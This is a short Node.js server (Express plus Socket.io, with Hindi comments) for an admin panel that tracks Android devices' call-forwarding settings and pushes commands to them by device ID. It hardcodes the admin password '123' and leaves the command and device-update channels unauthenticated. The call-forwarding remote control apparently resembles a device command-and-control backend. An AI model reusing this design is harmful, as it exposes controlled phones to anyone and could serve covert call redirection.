const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// In-memory storage for connected devices and states
const devices = new Map();

// Admin credentials (apne hisab se change kar sakte hain)
const ADMIN_CREDENTIALS = {
    username: "admin",
    password: "123"
};

// Admin Login API
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    if (username === ADMIN_CREDENTIALS.username && password === ADMIN_CREDENTIALS.password) {
        res.json({ success: true, message: "Login successful" });
    } else {
        res.status(401).json({ success: false, message: "Invalid username or password" });
    }
});

// WebSocket Connection handling
io.on('connection', (socket) => {
    console.log(`Client connected: ${socket.id}`);

    // Jab Android App ya Admin Panel connect ho aur apna data bheje
    socket.on('update_device', (data) => {
        // data format expected: { deviceId, name, status, callForwarding: { active, number, sim, status } }
        devices.set(data.deviceId, {
            ...data,
            lastSeen: new Date().toISOString()
        });

        // Sabhi connected admins ko live update bhej do
        io.emit('live_dashboard_update', Array.from(devices.values()));
    });

    // Admin panel se agar koi command bhejni ho app ko
    socket.on('send_command', (commandData) => {
        io.emit(`command_${commandData.deviceId}`, commandData);
    });

    socket.on('disconnect', () => {
        console.log(`Client disconnected: ${socket.id}`);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running smoothly on http://localhost:${PORT}`);
});